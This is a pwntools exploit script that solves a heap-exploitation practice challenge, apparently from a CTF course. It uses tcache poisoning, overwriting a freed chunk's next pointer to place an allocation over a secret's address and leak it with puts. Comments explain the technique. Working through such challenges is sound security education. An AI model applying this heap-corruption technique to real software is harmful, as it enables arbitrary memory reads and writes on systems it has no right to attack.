# You can Solve 9.0 similarly, the idea is about tcache chunk when freed and tchunk when malloc'd
# Focus on the structure of tcache chunk in both cases i.e freed chunk and allocated chunk

from pwn import *

p = process("/challenge/seeking-smuggled-secrets-hard")

print(p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): "))

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"16")

print(p.clean())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"16")

print(p.clean())

p.sendline(b"free")
p.sendline(b"1")

print(p.clean())

p.sendline(b"free")
p.sendline(b"0")

print(p.clean())

p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(0x42B671 + 0x8)) # change this secret addr to secret + 0x8 to get second half of the secret

print(p.clean())

p.sendline(b"malloc")
p.sendline(b"2")
p.sendline(b"16")

print(p.clean())

p.sendline(b"malloc")
p.sendline(b"3") 
# here malloc() has already been through, notice returning ptr is only set to 0x0 but not free so allocator is not discarding this
p.sendline(b"16")

print(p.clean())

p.sendline(b"free")
p.sendline(b"2")

print(p.clean())

p.sendline(b"puts")
p.sendline(b"2")

half_secret = p.clean().split(b"Data: ")[1][:8]

print(b"half secret :: " + half_secret)

p.close()
